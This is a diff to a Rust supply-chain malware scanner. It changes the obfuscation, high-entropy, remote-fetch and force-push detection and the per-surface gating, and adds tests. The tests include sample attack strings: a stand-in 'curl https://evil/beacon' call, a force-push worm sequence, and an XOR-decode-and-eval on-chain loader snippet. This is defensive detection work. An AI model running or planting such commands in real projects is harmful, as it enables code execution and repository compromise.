@@ -15,7 +15,13 @@ use crate::surface::Surface;
 
 #[derive(Debug, Default, Clone, PartialEq)]
 pub struct CapabilityScore {
+    /// High-confidence structural obfuscation (injection markers + eval, the ESM re-entry
+    /// shim, decoder-name / charcode-array tells). Sufficient for the FP-sensitive priors.
     pub obfuscation: bool,
+    /// Density signal (long non-URL line or high-entropy tail). Fires on legitimately dense
+    /// benign content too, so it is NOT sufficient for the ConfigFile/DerivedScript prior —
+    /// only the more permissive lifecycle/hook surfaces treat it as a fire signal.
+    pub high_entropy: bool,
     pub credential_access: bool,
     pub network_egress: bool,
     pub process_spawn: bool,
@@ -25,6 +31,9 @@ pub struct CapabilityScore {
     pub on_chain_resolve: bool,
     pub trailing_code: bool,
     pub destructive_wipe: bool,
+    /// A lone outbound fetch/download token (curl/wget/fetch/iwr/…). Only consumed by the
+    /// TasksJson gate — a folder-open task that reaches out is suspicious on its own.
+    pub remote_fetch: bool,
     pub evidence: Vec<String>,
 }
 
@@ -47,20 +56,27 @@ lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
 lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
 lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");
 
+/// High-confidence lexical obfuscation: an injection marker with an eval/Function/atob sink,
+/// the ESM re-entry shim, or the family decoder-name / charcode-array tells. These are
+/// specific to injected payloads, so they alone may satisfy the FP-sensitive priors.
 fn obfuscation(content: &str) -> bool {
-    if global_dyn_re().is_match(content)
-        && (decoder_re().is_match(content)
-            || charcode_re().is_match(content)
-            || evalish_re().is_match(content))
-    {
+    // The bare charcode/decoder check below subsumes those two alternatives from the
+    // marker-scoped branch, so only `evalish` need be paired with the injection marker.
+    if global_dyn_re().is_match(content) && evalish_re().is_match(content) {
         return true;
     }
     if esm_shim_re().is_match(content) {
         return true;
     }
-    if charcode_re().is_match(content) || decoder_re().is_match(content) {
-        return true;
-    }
+    charcode_re().is_match(content) || decoder_re().is_match(content)
+}
+
+/// Density signals: an unusually long non-URL line, or a high-entropy tail. These fire on
+/// legitimately dense benign content too (embedded base64 keys, SRI/integrity hashes,
+/// minified bundles), so they are NOT high-confidence obfuscation. Only the more permissive
+/// auto-run surfaces (lifecycle scripts, git hooks) treat them as a fire signal; the
+/// FP-sensitive ConfigFile/DerivedScript priors require structural `obfuscation` instead.
+fn high_entropy(content: &str) -> bool {
     if content
         .lines()
         .any(|l| l.len() > 500 && !l.contains("data:") && !l.trim_start().starts_with("http"))
@@ -139,9 +155,17 @@ fn download_exec(content: &str) -> bool {
             .any(|c| dls.contains(c.get(1).unwrap().as_str()))
 }
 
+// --- RemoteFetch (a lone outbound fetch/download token; only gates TasksJson auto-run) ---
+fn remote_fetch(content: &str) -> bool {
+    fetch_tok_re().is_match(content)
+}
+
 // --- Propagation ---
-lazy_re!(amend_re, r"commit\s+.*--amend|--amend");
-lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)|-uf\b");
+// A `--amend` anywhere (the former `commit\s+.*--amend` alternative was subsumed by this).
+lazy_re!(amend_re, r"--amend");
+// A force-push: every force flag is scoped to a preceding `git push` (consistently — the
+// trailing unscoped `-uf` alternative that matched anywhere has been removed).
+lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)");
 lazy_re!(noverify_re, r"--no-verify");
 lazy_re!(
     publish_re,
@@ -276,6 +300,7 @@ pub fn score(content: &str, surface: Surface) -> CapabilityScore {
         }
     };
     mark(obfuscation(content), &mut s.obfuscation, "obfuscation", &mut s.evidence);
+    mark(high_entropy(content), &mut s.high_entropy, "high-entropy", &mut s.evidence);
     mark(
         credential_access(content, surface),
         &mut s.credential_access,
@@ -315,6 +340,8 @@ pub fn score(content: &str, surface: Surface) -> CapabilityScore {
         "destructive-wipe",
         &mut s.evidence,
     );
+    // Scored last so it never displaces the primary evidence label in `signature_id`.
+    mark(remote_fetch(content), &mut s.remote_fetch, "remote-fetch", &mut s.evidence);
     s
 }
 
@@ -327,8 +354,11 @@ pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
         || s.download_exec;
     match surface {
         Surface::ConfigFile => {
+            // Spec §7: an obfuscation/trailing-code prior AND a behavioral capability.
+            // The prior is what makes entry files FP-safe (§4); download_exec/on_chain_resolve
+            // are behavioral members of `behavioral`, so they fire *with* a prior, never alone.
             let prior = s.obfuscation || s.trailing_code;
-            (prior && behavioral) || s.on_chain_resolve || s.download_exec
+            prior && behavioral
         }
         Surface::DerivedScript => {
             let prior = s.obfuscation || s.trailing_code;
@@ -343,20 +373,23 @@ pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
                 || s.propagation
                 || s.on_chain_resolve
                 || s.obfuscation
+                || s.high_entropy
                 || (s.credential_access && s.network_egress)
                 || s.destructive_wipe
         }
         Surface::WorkflowFile => {
             (s.credential_access && s.network_egress) || s.propagation || s.download_exec
         }
-        // TasksJson folderOpen precondition + lone remote-fetch handling are enforced
-        // in the scanner (Task 7); here download_exec/propagation carry the decision.
-        Surface::TasksJson => s.download_exec || s.propagation,
+        // The folderOpen auto-run precondition is enforced by the scanner; here a lone
+        // remote-fetch token fires too (a folder-open task that reaches out is suspicious
+        // on its own), alongside download_exec/propagation. Spec §7 TasksJson row.
+        Surface::TasksJson => s.download_exec || s.propagation || s.remote_fetch,
         Surface::GitHook => {
             s.download_exec
                 || s.propagation
                 || (s.credential_access && s.network_egress)
                 || s.obfuscation
+                || s.high_entropy
         }
         Surface::PropagationScript => s.propagation || s.download_exec || s.destructive_wipe,
         Surface::BinaryAsset => s.magic_mismatch,
@@ -388,6 +421,23 @@ mod tests {
         )
         .obfuscation);
     }
+    #[test]
+    fn config_with_embedded_key_and_url_is_not_obfuscation_fp() {
+        // A benign config embedding a dense base64 key (a long, high-entropy line) plus a URL
+        // literal must NOT fire. A density signal alone is not high-confidence obfuscation and
+        // must not satisfy the FP-sensitive ConfigFile prior. (Was a Critical false positive.)
+        let key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AaZ0/+".repeat(20);
+        let cfg = format!(
+            "export default {{ publicKey: '{key}', databaseURL: 'https://app.firebaseio.com' }};\n"
+        );
+        let s = score(&cfg, Surface::ConfigFile);
+        assert!(!s.obfuscation, "dense/high-entropy content is not high-confidence obfuscation");
+        assert!(
+            !gate(Surface::ConfigFile, &s),
+            "a benign key-bearing config must not fire on a bare density signal"
+        );
+    }
+
     #[test]
     fn clean_config_not_obfuscated() {
         assert!(!score("export default { plugins: { tailwindcss: {} } };\n", Surface::ConfigFile)
@@ -435,6 +485,17 @@ mod tests {
         assert!(score("npm publish --access public", Surface::LifecycleScript).propagation);
         assert!(!score("npm publish --access public", Surface::PropagationScript).propagation);
     }
+    #[test]
+    fn propagation_forcepush_flags_require_push_context() {
+        // Consistent scoping: the git-worm conjunction needs a real `git push` with a force
+        // flag. A bare `-uf` token with no `push` must NOT count (it was an inconsistent
+        // unscoped alternation while --force/-f required a preceding `push`).
+        let real = "git commit --amend --no-verify\ngit push -uf --no-verify";
+        assert!(score(real, Surface::PropagationScript).propagation);
+        let no_push = "run --amend --no-verify\nsome -uf token";
+        assert!(!score(no_push, Surface::PropagationScript).propagation);
+    }
+
     #[test]
     fn on_chain_resolve_detected() {
         let js = "fetch('https://api.trongrid.io/v1/accounts/T../transactions').then(r=>{for(i=0;i<n;i++)o+=String.fromCharCode(b.charCodeAt(i)^k);eval(o)})";
@@ -520,6 +581,23 @@ mod tests {
         ));
     }
     #[test]
+    fn gate_config_lone_download_exec_or_onchain_does_not_fire() {
+        // Spec §7: ConfigFile fires only on (obfuscation OR trailing_code) AND a behavioral
+        // capability. A lone download_exec / on_chain_resolve with no prior must NOT fire —
+        // that prior is exactly what makes entry files FP-safe (spec §4).
+        assert!(!gate(Surface::ConfigFile, &sc(|s| s.download_exec = true)));
+        assert!(!gate(Surface::ConfigFile, &sc(|s| s.on_chain_resolve = true)));
+        // With a prior present, both still fire (they are behavioral capabilities).
+        assert!(gate(
+            Surface::ConfigFile,
+            &sc(|s| {
+                s.trailing_code = true;
+                s.download_exec = true;
+            })
+        ));
+    }
+
+    #[test]
     fn gate_lifecycle_behavior_no_obfuscation_needed() {
         assert!(gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
         assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
@@ -530,6 +608,15 @@ mod tests {
         assert!(gate(Surface::PropagationScript, &sc(|s| s.propagation = true)));
         assert!(!gate(Surface::PropagationScript, &sc(|s| s.process_spawn = true)));
     }
+    #[test]
+    fn gate_tasksjson_lone_remote_fetch() {
+        // A folderOpen tasks.json that fetches a remote resource with no exec sink must fire —
+        // spec §7's TasksJson row includes a lone remote-fetch token, not only download_exec.
+        assert!(gate(Surface::TasksJson, &score("curl https://evil/beacon", Surface::TasksJson)));
+        // A bare fetch token on a ConfigFile still must NOT fire (unchanged, FP-safe).
+        assert!(!gate(Surface::ConfigFile, &score("curl https://evil/beacon", Surface::ConfigFile)));
+    }
+
     #[test]
     fn gate_binary_asset() {
         assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
